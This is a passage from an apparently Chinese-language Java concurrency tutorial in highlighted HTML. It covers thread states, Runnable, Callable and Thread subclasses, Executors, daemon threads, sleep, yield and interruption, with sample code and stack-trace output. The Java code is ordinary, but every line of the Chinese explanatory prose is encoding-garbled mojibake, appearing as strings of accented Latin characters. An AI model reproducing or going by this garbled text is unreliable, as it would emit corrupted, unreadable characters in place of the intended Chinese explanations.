éœ€ç­‰å¾…å…¶å®ƒçº¿ç¨‹æ˜¾å¼åœ°å”¤é†’ï¼Œåœ¨ä¸€å®šæ—¶é—´ä¹‹åä¼šè¢«ç³»ç»Ÿè‡ªåŠ¨å”¤é†’ã€‚</p><p>è°ƒç”¨ Thread.sleep() æ–¹æ³•ä½¿çº¿ç¨‹è¿›å…¥é™æœŸç­‰å¾…çŠ¶æ€æ—¶ï¼Œå¸¸å¸¸ç”¨â€œä½¿ä¸€ä¸ªçº¿ç¨‹ç¡çœ â€è¿›è¡Œæè¿°ã€‚</p><p>è°ƒç”¨ Object.wait() æ–¹æ³•ä½¿çº¿ç¨‹è¿›å…¥é™æœŸç­‰å¾…æˆ–è€…æ— é™æœŸç­‰å¾…æ—¶ï¼Œå¸¸å¸¸ç”¨â€œæŒ‚èµ·ä¸€ä¸ªçº¿ç¨‹â€è¿›è¡Œæè¿°ã€‚</p><p>ç¡çœ å’ŒæŒ‚èµ·æ˜¯ç”¨æ¥æè¿°è¡Œä¸ºï¼Œè€Œé˜»å¡å’Œç­‰å¾…ç”¨æ¥æè¿°çŠ¶æ€ã€‚</p><p>é˜»å¡å’Œç­‰å¾…çš„åŒºåˆ«åœ¨äºï¼Œé˜»å¡æ˜¯è¢«åŠ¨çš„ï¼Œå®ƒæ˜¯åœ¨ç­‰å¾…è·å–ä¸€ä¸ªæ’å®ƒé”ã€‚è€Œç­‰å¾…æ˜¯ä¸»åŠ¨çš„ï¼Œé€šè¿‡è°ƒç”¨ Thread.sleep() å’Œ Object.wait() ç­‰æ–¹æ³•è¿›å…¥ã€‚</p><p>| è¿›å…¥æ–¹æ³• | é€€å‡ºæ–¹æ³• | | --- | --- | | Thread.sleep() æ–¹æ³• | æ—¶é—´ç»“æŸ | | è®¾ç½®äº† Timeout å‚æ•°çš„ Object.wait() æ–¹æ³• | æ—¶é—´ç»“æŸ / Object.notify() / Object.notifyAll()  | | è®¾ç½®äº† Timeout å‚æ•°çš„ Thread.join() æ–¹æ³• | æ—¶é—´ç»“æŸ / è¢«è°ƒç”¨çš„çº¿ç¨‹æ‰§è¡Œå®Œæ¯• | | LockSupport.parkNanos() æ–¹æ³• | LockSupport.unpark(Thread) | | LockSupport.parkUntil() æ–¹æ³• | LockSupport.unpark(Thread) |</p><h2>æ­»äº¡ï¼ˆTerminatedï¼‰</h2><p>å¯ä»¥æ˜¯çº¿ç¨‹ç»“æŸä»»åŠ¡ä¹‹åè‡ªå·±ç»“æŸï¼Œæˆ–è€…äº§ç”Ÿäº†å¼‚å¸¸è€Œç»“æŸã€‚</p><h2>äºŒã€ä½¿ç”¨çº¿ç¨‹</h2><p>æœ‰ä¸‰ç§ä½¿ç”¨çº¿ç¨‹çš„æ–¹æ³•ï¼š</p><ul><li>å®ç° Runnable æ¥å£ï¼›</li><li>å®ç° Callable æ¥å£ï¼›</li><li>ç»§æ‰¿ Thread ç±»ã€‚</li></ul><p>å®ç° Runnable å’Œ Callable æ¥å£çš„ç±»åªèƒ½å½“åšä¸€ä¸ªå¯ä»¥åœ¨çº¿ç¨‹ä¸­è¿è¡Œçš„ä»»åŠ¡ï¼Œä¸æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„çº¿ç¨‹ï¼Œå› æ­¤æœ€åè¿˜éœ€è¦é€šè¿‡ Thread æ¥è°ƒç”¨ã€‚å¯ä»¥è¯´ä»»åŠ¡æ˜¯é€šè¿‡çº¿ç¨‹é©±åŠ¨ä»è€Œæ‰§è¡Œçš„ã€‚</p><h2>å®ç° Runnable æ¥å£</h2><p>éœ€è¦å®ç° run() æ–¹æ³•ã€‚</p><p>é€šè¿‡ Thread è°ƒç”¨ start() æ–¹æ³•æ¥å¯åŠ¨çº¿ç¨‹ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">MyRunnable</span> <span class=\"kd\">implements</span> <span class=\"n\">Runnable</span> <span class=\"o\">{</span>\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">run</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"c1\">// ...\n</span><span class=\"c1\"></span>    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">MyRunnable</span> <span class=\"n\">instance</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">MyRunnable</span><span class=\"o\">();</span>\n    <span class=\"n\">Thread</span> <span class=\"n\">thread</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Thread</span><span class=\"o\">(</span><span class=\"n\">instance</span><span class=\"o\">);</span>\n    <span class=\"n\">thread</span><span class=\"o\">.</span><span class=\"na\">start</span><span class=\"o\">();</span>\n<span class=\"o\">}</span></code></pre></div><h2>å®ç° Callable æ¥å£</h2><p>ä¸ Runnable ç›¸æ¯”ï¼ŒCallable å¯ä»¥æœ‰è¿”å›å€¼ï¼Œè¿”å›å€¼é€šè¿‡ FutureTask è¿›è¡Œå°è£…ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">MyCallable</span> <span class=\"kd\">implements</span> <span class=\"n\">Callable</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"o\">{</span>\n    <span class=\"kd\">public</span> <span class=\"n\">Integer</span> <span class=\"nf\">call</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"n\">123</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"kd\">throws</span> <span class=\"n\">ExecutionException</span><span class=\"o\">,</span> <span class=\"n\">InterruptedException</span> <span class=\"o\">{</span>\n    <span class=\"n\">MyCallable</span> <span class=\"n\">mc</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">MyCallable</span><span class=\"o\">();</span>\n    <span class=\"n\">FutureTask</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"n\">ft</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">FutureTask</span><span class=\"o\">&lt;&gt;(</span><span class=\"n\">mc</span><span class=\"o\">);</span>\n    <span class=\"n\">Thread</span> <span class=\"n\">thread</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Thread</span><span class=\"o\">(</span><span class=\"n\">ft</span><span class=\"o\">);</span>\n    <span class=\"n\">thread</span><span class=\"o\">.</span><span class=\"na\">start</span><span class=\"o\">();</span>\n    <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">ft</span><span class=\"o\">.</span><span class=\"na\">get</span><span class=\"o\">());</span>\n<span class=\"o\">}</span></code></pre></div><h2>ç»§æ‰¿ Thread ç±»</h2><p>åŒæ ·ä¹Ÿæ˜¯éœ€è¦å®ç° run() æ–¹æ³•ï¼Œå› ä¸º Thread ç±»ä¹Ÿå®ç°äº† Runable æ¥å£ã€‚</p><p>å½“è°ƒç”¨ start() æ–¹æ³•å¯åŠ¨ä¸€ä¸ªçº¿ç¨‹æ—¶ï¼Œè™šæ‹Ÿæœºä¼šå°†è¯¥çº¿ç¨‹æ”¾å…¥å°±ç»ªé˜Ÿåˆ—ä¸­ç­‰å¾…è¢«è°ƒåº¦ï¼Œå½“ä¸€ä¸ªçº¿ç¨‹è¢«è°ƒåº¦æ—¶ä¼šæ‰§è¡Œè¯¥çº¿ç¨‹çš„ run() æ–¹æ³•ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">MyThread</span> <span class=\"kd\">extends</span> <span class=\"n\">Thread</span> <span class=\"o\">{</span>\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">run</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"c1\">// ...\n</span><span class=\"c1\"></span>    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">MyThread</span> <span class=\"n\">mt</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">MyThread</span><span class=\"o\">();</span>\n    <span class=\"n\">mt</span><span class=\"o\">.</span><span class=\"na\">start</span><span class=\"o\">();</span>\n<span class=\"o\">}</span></code></pre></div><h2>å®ç°æ¥å£ VS ç»§æ‰¿ Thread</h2><p>å®ç°æ¥å£ä¼šæ›´å¥½ä¸€äº›ï¼Œå› ä¸ºï¼š</p><ul><li>Java ä¸æ”¯æŒå¤šé‡ç»§æ‰¿ï¼Œå› æ­¤ç»§æ‰¿äº† Thread ç±»å°±æ— æ³•ç»§æ‰¿å…¶å®ƒç±»ï¼Œä½†æ˜¯å¯ä»¥å®ç°å¤šä¸ªæ¥å£ï¼›</li><li>ç±»å¯èƒ½åªè¦æ±‚å¯æ‰§è¡Œå°±è¡Œï¼Œç»§æ‰¿æ•´ä¸ª Thread ç±»å¼€é”€è¿‡å¤§ã€‚</li></ul><h2>ä¸‰ã€åŸºç¡€çº¿ç¨‹æœºåˆ¶</h2><h2>Executor</h2><p>Executor ç®¡ç†å¤šä¸ªå¼‚æ­¥ä»»åŠ¡çš„æ‰§è¡Œï¼Œè€Œæ— éœ€ç¨‹åºå‘˜æ˜¾å¼åœ°ç®¡ç†çº¿ç¨‹çš„ç”Ÿå‘½å‘¨æœŸã€‚è¿™é‡Œçš„å¼‚æ­¥æ˜¯æŒ‡å¤šä¸ªä»»åŠ¡çš„æ‰§è¡Œäº’ä¸å¹²æ‰°ï¼Œä¸éœ€è¦è¿›è¡ŒåŒæ­¥æ“ä½œã€‚</p><p>ä¸»è¦æœ‰ä¸‰ç§ Executorï¼š</p><ul><li>CachedThreadPoolï¼šä¸€ä¸ªä»»åŠ¡åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ï¼›</li><li>FixedThreadPoolï¼šæ‰€æœ‰ä»»åŠ¡åªèƒ½ä½¿ç”¨å›ºå®šå¤§å°çš„çº¿ç¨‹ï¼›</li><li>SingleThreadExecutorï¼šç›¸å½“äºå¤§å°ä¸º 1 çš„ FixedThreadPoolã€‚</li></ul><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">ExecutorService</span> <span class=\"n\">executorService</span> <span class=\"o\">=</span> <span class=\"n\">Executors</span><span class=\"o\">.</span><span class=\"na\">newCachedThreadPool</span><span class=\"o\">();</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">5</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n        <span class=\"n\">executorService</span><span class=\"o\">.</span><span class=\"na\">execute</span><span class=\"o\">(</span><span class=\"k\">new</span> <span class=\"n\">MyRunnable</span><span class=\"o\">());</span>\n    <span class=\"o\">}</span>\n    <span class=\"n\">executorService</span><span class=\"o\">.</span><span class=\"na\">shutdown</span><span class=\"o\">();</span>\n<span class=\"o\">}</span></code></pre></div><h2>Daemon</h2><p>å®ˆæŠ¤çº¿ç¨‹æ˜¯ç¨‹åºè¿è¡Œæ—¶åœ¨åå°æä¾›æœåŠ¡çš„çº¿ç¨‹ï¼Œä¸å±äºç¨‹åºä¸­ä¸å¯æˆ–ç¼ºçš„éƒ¨åˆ†ã€‚</p><p>å½“æ‰€æœ‰éå®ˆæŠ¤çº¿ç¨‹ç»“æŸæ—¶ï¼Œç¨‹åºä¹Ÿå°±ç»ˆæ­¢ï¼ŒåŒæ—¶ä¼šæ€æ­»æ‰€æœ‰å®ˆæŠ¤çº¿ç¨‹ã€‚</p><p>main() å±äºéå®ˆæŠ¤çº¿ç¨‹ã€‚</p><p>ä½¿ç”¨ setDaemon() æ–¹æ³•å°†ä¸€ä¸ªçº¿ç¨‹è®¾ç½®ä¸ºå®ˆæŠ¤çº¿ç¨‹ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">Thread</span> <span class=\"n\">thread</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Thread</span><span class=\"o\">(</span><span class=\"k\">new</span> <span class=\"n\">MyRunnable</span><span class=\"o\">());</span>\n    <span class=\"n\">thread</span><span class=\"o\">.</span><span class=\"na\">setDaemon</span><span class=\"o\">(</span><span class=\"kc\">true</span><span class=\"o\">);</span>\n<span class=\"o\">}</span></code></pre></div><h2>sleep()</h2><p>Thread.sleep(millisec) æ–¹æ³•ä¼šä¼‘çœ å½“å‰æ­£åœ¨æ‰§è¡Œçš„çº¿ç¨‹ï¼Œmillisec å•ä½ä¸ºæ¯«ç§’ã€‚</p><p>sleep() å¯èƒ½ä¼šæŠ›å‡º InterruptedExceptionï¼Œå› ä¸ºå¼‚å¸¸ä¸èƒ½è·¨çº¿ç¨‹ä¼ æ’­å› main() ä¸­ï¼Œå› æ­¤å¿…é¡»åœ¨æœ¬åœ°è¿›è¡Œå¤„ç†ã€‚çº¿ç¨‹ä¸­æŠ›å‡ºçš„å…¶å®ƒå¼‚å¸¸ä¹ŸåŒæ ·éœ€è¦åœ¨æœ¬åœ°è¿›è¡Œå¤„ç†ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">run</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n    <span class=\"k\">try</span> <span class=\"o\">{</span>\n        <span class=\"n\">Thread</span><span class=\"o\">.</span><span class=\"na\">sleep</span><span class=\"o\">(</span><span class=\"n\">3000</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span> <span class=\"k\">catch</span> <span class=\"o\">(</span><span class=\"n\">InterruptedException</span> <span class=\"n\">e</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">printStackTrace</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><h2>yield()</h2><p>å¯¹é™æ€æ–¹æ³• Thread.yield() çš„è°ƒç”¨å£°æ˜äº†å½“å‰çº¿ç¨‹å·²ç»å®Œæˆäº†ç”Ÿå‘½å‘¨æœŸä¸­æœ€é‡è¦çš„éƒ¨åˆ†ï¼Œå¯ä»¥åˆ‡æ¢ç»™å…¶å®ƒçº¿ç¨‹æ¥æ‰§è¡Œã€‚è¯¥æ–¹æ³•åªæ˜¯å¯¹çº¿ç¨‹è°ƒåº¦å™¨çš„ä¸€ä¸ªå»ºè®®ï¼Œè€Œä¸”ä¹Ÿåªæ˜¯å»ºè®®å…·æœ‰ç›¸åŒä¼˜å…ˆçº§çš„å…¶å®ƒçº¿ç¨‹å¯ä»¥è¿è¡Œã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">run</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n    <span class=\"n\">Thread</span><span class=\"o\">.</span><span class=\"na\">yield</span><span class=\"o\">();</span>\n<span class=\"o\">}</span></code></pre></div><h2>å››ã€ä¸­æ–­</h2><p>ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œå®Œæ¯•ä¹‹åä¼šè‡ªåŠ¨ç»“æŸï¼Œå¦‚æœåœ¨è¿è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿå¼‚å¸¸ä¹Ÿä¼šæå‰ç»“æŸã€‚</p><h2>InterruptedException</h2><p>é€šè¿‡è°ƒç”¨ä¸€ä¸ªçº¿ç¨‹çš„ interrupt() æ¥ä¸­æ–­è¯¥çº¿ç¨‹ï¼Œå¦‚æœè¯¥çº¿ç¨‹å¤„äºé˜»å¡ã€é™æœŸç­‰å¾…æˆ–è€…æ— é™æœŸç­‰å¾…çŠ¶æ€ï¼Œé‚£ä¹ˆå°±ä¼šæŠ›å‡º InterruptedExceptionï¼Œä»è€Œæå‰ç»“æŸè¯¥çº¿ç¨‹ã€‚ä½†æ˜¯ä¸èƒ½ä¸­æ–­ I/O é˜»å¡å’Œ synchronized é”é˜»å¡ã€‚</p><p>å¯¹äºä»¥ä¸‹ä»£ç ï¼Œåœ¨ main() ä¸­å¯åŠ¨ä¸€ä¸ªçº¿ç¨‹ä¹‹åå†ä¸­æ–­å®ƒï¼Œç”±äºçº¿ç¨‹ä¸­è°ƒç”¨äº† Thread.sleep() æ–¹æ³•ï¼Œå› æ­¤ä¼šæŠ›å‡ºä¸€ä¸ª InterruptedExceptionï¼Œä»è€Œæå‰ç»“æŸçº¿ç¨‹ï¼Œä¸æ‰§è¡Œä¹‹åçš„è¯­å¥ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">InterruptExample</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"kd\">static</span> <span class=\"kd\">class</span> <span class=\"nc\">MyThread1</span> <span class=\"kd\">extends</span> <span class=\"n\">Thread</span> <span class=\"o\">{</span>\n        <span class=\"nd\">@Override</span>\n        <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">run</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n            <span class=\"k\">try</span> <span class=\"o\">{</span>\n                <span class=\"n\">Thread</span><span class=\"o\">.</span><span class=\"na\">sleep</span><span class=\"o\">(</span><span class=\"n\">2000</span><span class=\"o\">);</span>\n                <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;Thread run&#34;</span><span class=\"o\">);</span>\n            <span class=\"o\">}</span> <span class=\"k\">catch</span> <span class=\"o\">(</span><span class=\"n\">InterruptedException</span> <span class=\"n\">e</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">printStackTrace</span><span class=\"o\">();</span>\n            <span class=\"o\">}</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"kd\">throws</span> <span class=\"n\">InterruptedException</span> <span class=\"o\">{</span>\n    <span class=\"n\">Thread</span> <span class=\"n\">thread1</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">MyThread1</span><span class=\"o\">();</span>\n    <span class=\"n\">thread1</span><span class=\"o\">.</span><span class=\"na\">start</span><span class=\"o\">();</span>\n    <span class=\"n\">thread1</span><span class=\"o\">.</span><span class=\"na\">interrupt</span><span class=\"o\">();</span>\n    <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;Main run&#34;</span><span class=\"o\">);</span>\n<span class=\"o\">}</span>\n<span class=\"n\">Main</span> <span class=\"n\">run</span>\n<span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">lang</span><span class=\"o\">.</span><span class=\"na\">InterruptedException</span><span class=\"o\">:</span> <span class=\"n\">sleep</span> <span class=\"n\">interrupted</span>\n    <span class=\"n\">at</span> <span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">lang</span><span class=\"o\">.</span><span class=\"na\">Thread</span><span class=\"o\">.</span><span class=\"na\">sleep</span><span class=\"o\">(</span><span class=\"n\">Native</span> <span class=\"n\">Method</span><span class=\"o\">)</span>\n    <span class=\"n\">at</span> <span class=\"n\">InterruptExample</span><span class=\"o\">.</span><span class=\"na\">lambda$main$0</span><span class=\"o\">(</span><span class=\"n\">InterruptExample</span><span class=\"o\">.</span><span class=\"na\">java</span><span class=\"o\">:</span><span class=\"n\">5</span><span class=\"o\">)</span>\n    <span class=\"n\">at</span> <span class=\"n\">InterruptExample$$Lambda$1</span><span class=\"o\">/</span><span class=\"n\">713338599</span><span class=\"o\">.</span><span class=\"na\">run</span><span class=\"o\">(</span><span class=\"n\">Unknown</span> <span class=\"n\">Source</span><span class=\"o\">)</span>\n    <span class=\"n\">at</span> <span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">lang</span><span class=\"o\">.</span><span class=\"na\">Thread</span><span class=\"o\">.</span><span class=\"na\">run</span><span class=\"o\">(</span><span class=\"n\">Thread</span><span class=\"o\">.</span><span class=\"na\">java</span><span class=\"o\">:</span><span class=\"n\">745</span><span class=\"o\">)</span></code></pre></div><h2>interrupted()</h2><p>å¦‚æœä¸€ä¸ªçº¿ç¨‹çš„ run() æ–¹æ³•æ‰§è¡Œä¸€ä¸ªæ— é™å¾ªç¯ï¼Œå¹¶ä¸”æ²¡æœ‰æ‰§è¡Œ sleep() ç­‰ä¼šæŠ›å‡º InterruptedException çš„æ“ä½œï¼Œé‚£ä¹ˆè°ƒç”¨çº¿ç¨‹çš„ interrupt() æ–¹æ³•å°±æ— æ³•ä½¿çº¿ç¨‹æå‰ç»“æŸã€‚</p><p>ä½†æ˜¯è°ƒç”¨ interrupt() æ–¹æ³•ä¼šè®¾ç½®çº¿ç¨‹çš„ä¸­æ–­æ ‡è®°ï¼Œæ­¤æ—¶è°ƒç”¨ interrupted() æ–¹æ³•ä¼šè¿”å› trueã€‚å› æ­¤å¯ä»¥åœ¨å¾ªç¯ä½“ä¸­ä½¿ç”¨ interrupted() æ–¹æ³•æ¥åˆ¤æ–­çº¿ç¨‹æ˜¯å¦å¤„äºä¸­æ–­çŠ¶æ€ï¼Œä»è€Œæå‰ç»“æŸçº¿ç¨‹ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">InterruptExample</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"kd\">static</span> <span class=\"kd\">class</span> <span class=\"nc\">MyThread2</span> <span class=\"kd\">extends</span> <span class=\"n\">Thread</span> <span class=\"o\">{</span>\n        <span class=\"nd\">@Override</span>\n        <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">run</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n            <span class=\"k\">while</span> <span class=\"o\">(!</span><span class=\"n\">interrupted</span><span class=\"o\">())</span> <span class=\"o\">{</span>\n                <span class=\"c1\">// ..\n</span><span class=\"c1\"></span>            <span class=\"o\">}</span>\n            <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;Thread end&#34;</span><span class=\"o\">);</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"kd\">throws</span> <span class=\"n\">InterruptedException</span> <span class=\"o\">{</span>\n    <span class=\"n\">Thread</span> <span class=\"n\">thread2</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">MyThread2</span><span class=\"o\">();</span>\n    <span class=\"n\">thread2</span><span class=\"o\">.</span><span class=\"na\">start</span><span class=\"o\">();</span>\n    <span class=\"n\">thread2</span><span class=\"o\">.</span><span class=\"na\">interrupt</span><span class=\"o\">();</span>\n<span class=\"o\">}</span>\n<span class=\"n\">Thread</span> <span class=\"n\">end</span></code></pre></div><h2>Executor çš„ä¸­æ–­æ“ä½œ</h2><p>è°ƒç”¨ Executor çš„ shutdown() æ–¹æ³•ä¼šç­‰å¾…çº¿ç¨‹éƒ½æ‰§è¡Œå®Œæ¯•ä¹‹åå†å…³é—­ï¼Œä½†æ˜¯å¦‚æœè°ƒç”¨çš„æ˜¯ shutdownNow() æ–¹æ³•ï¼Œåˆ™ç›¸å½“äºè°ƒç”¨æ¯ä¸ªçº¿ç¨‹çš„ interrupt() æ–¹æ³•ã€‚</p><p>ä»¥ä¸‹ä½¿ç”¨ Lambda åˆ›å»ºçº¿ç¨‹ï¼Œç›¸å½“äºåˆ›å»ºäº†ä¸€ä¸ªåŒ¿åå†…éƒ¨çº¿ç¨‹ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">ExecutorService</span> <span class=\"n\">executorService</span> <span class=\"o\">=</span> <span class=\"n\">Executors</span><span class=\"o\">.</span><span class=\"na\">newCachedThreadPool</span><span class=\"o\">();</span>\n    <span class=\"n\">executorService</span><span class=\"o\">.</span><span class=\"na\">execute</span><span class=\"o\">(()</span> <span class=\"o\">-&gt;</span> <span class=\"o\">{</span>\n        <span class=\"k\">try</span> <span class=\"o\">{</span>\n            <span class=\"n\">Thread</span><span class=\"o\">.</span><span class=\"na\">sleep</span><span class=\"o\">(</span><span class=\"n\">2000</span><span class=\"o\">);</span>\n            <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;Thread run&#34;</span><span class=\"o\">);</span>\n        <span class=\"o\">}</span> <span class=\"k\">catch</span> <span class=\"o\">(</span><span class=\"n\">InterruptedException</span> <span class=\"n\">e</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">printStackTrace</span><span class=\"o\">();</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">});</span>\n    <span class=\"n\">executorService</span><span class=\"o\">.</span><span class=\"na\">shutdownNow</span><span class=\"o\">();</span>\n    <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;Main run&#34;</span><span class=\"o\">);</span>\n<span class=\"o\">}</span>\n<span class=\"n\">Main</span> <span class=\"n\">run</span>\n<span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">lang</span><span class=\"o\">.</span><span class=\"na\">InterruptedException</span><span class=\"o\">:</span> <span class=\"n\">sleep</span> <span class=\"n\">interrupted</span>\n    <span class=\"n\">at</span> <span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">lang</span><span class=\"o\">.</span><span class=\"na\">Thread</span><span class=\"o\">.</span><span class=\"na\">sleep</span><span class=\"o\">(</span><span class=\"n\">Native</span> <span class=\"n\">Method</span><span class=\"o\">)</span>\n    <span class=\"n\">at</span> <span class=\"n\">ExecutorInterruptExample</span><span class=\"o\">.</span><span class=\"na\">lambda$main$0</span><span class=\"o\">(</span><span class=\"n\">ExecutorInterruptExample</span><span class=\"o\">.</span><span class=\"na\">java</span><span class=\"o\">:</span><span class=\"n\">9</span><span class=\"o\">)</span>\n    <span class=\"n\">at</span> <span class=\"n\">ExecutorInterruptExample$$Lambda$1</span><span class=\"o\">/</span><span class=\"n\">1160460865</span><span class=\"o\">.</span><span class=\"na\">run</span><span class=\"o\">(</span><span class=\"n\">Unknown</span> <span class=\"n\">Source</span><span class=\"o\">)</span>\n    <span class=\"n\">at</span> <span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">util</span><span class=\"o\">.</span><span class=\"na\">concurrent</span><span class=\"o\">.</span><span class=\"na\">ThreadPoolExecutor</span><span class=\"o\">.</span><span class=\"na\">runWorker</span><span class=\"o\">(</span><span class=\"n\">ThreadPoolExecutor</span><span class=\"o\">.</span><span class=\"na\">java</span><span class=\"o\">:</span><span class=\"n\">1142</span><span class=\"o\">)</span>\n    <span class=\"n\">at</span> <span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">util</span><span class=\"o\">.</span><span class=\"na\">concurrent</span><span class=\"o\">.</span><span 